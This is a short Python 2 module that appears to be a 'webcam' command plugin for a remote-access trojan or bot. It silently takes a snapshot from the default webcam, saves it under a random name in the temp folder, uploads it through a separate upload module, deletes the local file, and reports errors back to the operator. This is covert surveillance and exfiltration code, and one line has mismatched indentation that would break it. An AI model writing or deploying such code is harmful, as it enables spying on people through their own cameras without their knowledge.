from VideoCapture import Device
import os
import upload
import utils
import random
import string
    
def run():
    try:
        cam = Device()
        filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
        filename += ".jpg"
        filepath = os.path.join(os.environ['temp'], filename)
        cam.saveSnapshot(filepath)
        upload.run(filepath)
		os.remove(filepath)
    except Exception, exc:
        utils.send_output(exc)
            
            
def help():
    help_text = """
Usage: webcam
Takes a picture with default webcam.

"""
    return help_text